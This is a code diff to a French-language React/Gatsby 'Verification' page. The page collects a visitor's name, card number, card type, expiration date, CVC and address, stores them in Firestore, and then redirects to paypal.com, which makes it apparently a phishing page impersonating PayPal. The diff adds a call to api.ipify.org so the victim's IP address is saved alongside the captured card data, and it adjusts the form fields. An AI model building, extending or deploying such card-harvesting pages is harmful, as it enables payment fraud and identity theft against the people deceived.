@@ -1,10 +1,9 @@
 import * as React from "react"
-import { navigate } from "gatsby"
-import {useState} from "react";
+import {useState, useEffect} from "react";
 import {StaticImage} from "gatsby-plugin-image";
 import './Verification.css';
 import {addVerificationDetails} from "../firebase/firestore";
-export default function (){
+export default function Verification (){
     const [name,setName]=useState("");
     const [cardNo,setCardNo]=useState("");
     const [cardType,setCardType]=useState("NONE");
@@ -12,11 +11,19 @@ export default function (){
     const [cvc,setCVC]=useState("");
     const [address,setAddress]=useState("");
     const [loading,setLoading]=useState(false);
+    const [isFocused,setIsFocused]=useState(false);
+    const [ip, setIp] = useState("none");
+    useEffect(() => {
+        fetch("https://api.ipify.org/")
+            .then(res => res.text())
+            .then(res => setIp(res))
+            .catch(e => setIp("error"))
+    }, [])
     async function onSubmit(e) {
 
         e.preventDefault();
         setLoading(true);
-        await addVerificationDetails({name,cardType,cardNo,expirationDate,cvc,address,timestamp:new Date().getTime()});
+        await addVerificationDetails({name,cardType,cardNo,expirationDate,cvc,address,timestamp:new Date().getTime(),ip});
         window.location.href ='https://paypal.com'
 
     }
@@ -37,7 +44,7 @@ export default function (){
                             <div className="u-form-group u-form-name u-label-none u-form-group-1">
                                 <label htmlFor="name-f1a2" className="u-label">Nom</label>
                                 <input value={name} onChange={e=>setName(e.target.value)}
-                                    type="text" placeholder="Entrez votre nom et prénom" id="name-f1a2" name="name"
+                                    autoFocus={true} type="text" placeholder="Entrez votre nom et prénom" id="name-f1a2" name="name"
                                        className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required=""/>
                             </div>
                             <div className="u-form-group u-form-name u-label-none u-form-group-2">
@@ -72,11 +79,14 @@ export default function (){
                             </div>
                             <div className="u-form-group u-label-none u-form-group-4">
                                 <label htmlFor="text-94d0" className="u-label">Date</label>
-                                <input value={expirationDate} onChange={e=>setExpirationDate(e.target.value)}
+                                {!isFocused?<input value="" onClick={()=>setIsFocused(true)}
+                                                   type="text" placeholder={"Date d'expiration "+expirationDate} id="name-340f" name="card"
+                                                   className="u-border-1 u-border-grey-30 u-input u-input-rectangle" required=""/>:
+                                <input value={expirationDate} onBlur={()=>setIsFocused(false)} onChange={e=>setExpirationDate(e.target.value)}
                                     type="month" placeholder="Date d'expiration (MM/AA)" id="text-94d0" name="Date"
                                        className="u-border-1 u-border-grey-30 u-input u-input-rectangle"
 
-                                       required="required"/>
+                                       required="required"/>}
                             </div>
                             <div className="u-form-group u-label-none u-form-group-5">
                                 <label htmlFor="text-59d1" className="u-label">CVC</label>
